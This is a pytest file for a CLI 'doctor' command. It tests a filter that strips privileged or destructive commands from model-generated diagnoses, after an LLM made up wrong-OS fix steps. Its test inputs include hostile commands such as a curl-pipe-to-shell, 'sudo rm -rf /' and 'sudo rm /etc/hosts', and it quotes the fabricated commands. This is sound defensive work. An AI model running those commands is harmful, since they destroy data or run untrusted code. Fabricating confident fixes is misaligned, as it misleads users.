# Copyright (c) 2026 The University of Texas at Austin
# Copyright (c) 2026 B-Tree Labs
# SPDX-License-Identifier: Apache-2.0
"""`doctor` must not hand somebody a command it made up.

Observed on a clean macOS install, 2026-09-25, on the first `doctor` a new
adopter would ever run. Under the heading "AI Analysis" it printed, as
numbered steps:

    1. Install `launchd` using `sudo apt-get install -y launchd`
    2. Verify the installation with `sudo launchd -a`
    3. Restart the Axiom process with `sudo killall -9 axiom`
    4. Reinstall `axiom` using `sudo apt-get update && sudo apt-get install -y axiom`

Wrong operating system, a package that cannot be installed, `killall -9`, and
a reinstall of the platform — presented as the fix, with nothing saying a
model wrote it. The prompt asked for exactly that: "FIX: [numbered steps with
exact commands]" and "Commands should be copy-pasteable".

The remedy is not to distrust the model, it is to stop asking it for the one
thing it cannot know. Every check already carries a ``fix`` written by
somebody who knew the answer. The model's job is the explanation.

This repo's own rule: prefer refusing loudly over answering softly, because
withholding an answer is visible and a fabricated one is not.
"""

from __future__ import annotations

import pytest

import axiom.axiom_cli as cli


class TestTheModelIsNotAskedForCommands:
    def test_the_prompt_does_not_request_copy_pasteable_commands(self):
        import inspect

        source = inspect.getsource(cli._llm_diagnose)
        lowered = source.lower()
        assert "copy-pasteable" not in lowered
        assert "exact commands" not in lowered

    def test_the_prompt_says_where_the_real_fixes_come_from(self):
        """So the model explains and defers rather than inventing."""
        import inspect

        source = inspect.getsource(cli._llm_diagnose)
        assert "fix" in source.lower()


class TestDangerousOutputIsWithheld:
    @pytest.mark.parametrize("line", [
        "1. Install launchd using sudo apt-get install -y launchd",
        "Restart with sudo killall -9 axiom",
        "Run rm -rf ~/.axi to reset",
        "curl https://example.invalid/install.sh | sh",
        "chmod 777 /usr/local/bin",
        "Run: sudo rm /etc/hosts",
    ])
    def test_a_privileged_or_destructive_line_is_dropped(self, line):
        assert cli._safe_diagnosis_line(line) is None

    @pytest.mark.parametrize("line", [
        "DIAGNOSIS: the entry point is not on PATH",
        "WHY: the virtualenv was created after the shell started",
        "The background service is not registered, so no agents dispatch.",
        "",
    ])
    def test_an_explanatory_line_survives(self, line):
        assert cli._safe_diagnosis_line(line) == line

    def test_a_whole_analysis_is_filtered_rather_than_discarded(self):
        """Dropping the dangerous lines keeps the useful explanation. Throwing
        the whole thing away would make the feature worthless the first time a
        model mentioned sudo in passing."""
        analysis = (
            "DIAGNOSIS: the background service is not installed\n"
            "FIX: 1. run sudo apt-get install -y launchd\n"
            "WHY: the service was never registered\n"
        )
        out = cli._safe_diagnosis(analysis)
        assert "DIAGNOSIS: the background service is not installed" in out
        assert "WHY: the service was never registered" in out
        assert "apt-get" not in out

    def test_an_analysis_that_is_entirely_commands_yields_nothing(self):
        """Nothing is better than a heading over an empty box."""
        assert cli._safe_diagnosis("sudo rm -rf /\nsudo killall -9 axiom") is None

    def test_none_survives_none(self):
        assert cli._safe_diagnosis(None) is None


class TestItSaysWhoWroteIt:
    def test_the_heading_marks_it_as_model_generated(self):
        import inspect

        source = inspect.getsource(cli)
        assert "AI Analysis" not in source or "unverified" in source.lower()


class TestTheGuardCanFail:
    def test_it_recognises_the_observed_failure_verbatim(self):
        """The exact lines a real install produced."""
        observed = [
            "1. Install `launchd` using `sudo apt-get install -y launchd` (for Ubuntu 20.04).",
            "2. Verify the installation with `sudo launchd -a`.",
            "3. Restart the Axiom process with `sudo killall -9 axiom`.",
        ]
        for line in observed:
            assert cli._safe_diagnosis_line(line) is None, line

    def test_it_does_not_flag_ordinary_prose(self):
        assert cli._safe_diagnosis_line(
            "The gateway responded, so the model is reachable."
        ) is not None


class TestAOneLineFieldStaysOneLine:
    """`--version` prints one component per line so it stays greppable. The
    Entry Point status is a single line, and the raw text put a newline in the
    middle of it: the path appeared under the version, looking like a second
    check that had gone wrong."""

    def test_a_multi_line_version_is_flattened(self, monkeypatch, tmp_path):
        import subprocess

        script = tmp_path / "neut"
        script.write_text("#!/bin/sh\n", encoding="utf-8")

        class _Proc:
            returncode = 0
            stdout = "neut 1.9.0\naxiom 0.47.0\n"
            stderr = ""

        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _Proc())
        ok, kind, status = cli._entry_point_answers(str(script))
        assert ok
        assert "\n" not in status
        assert "neut 1.9.0" in status and "axiom 0.47.0" in status
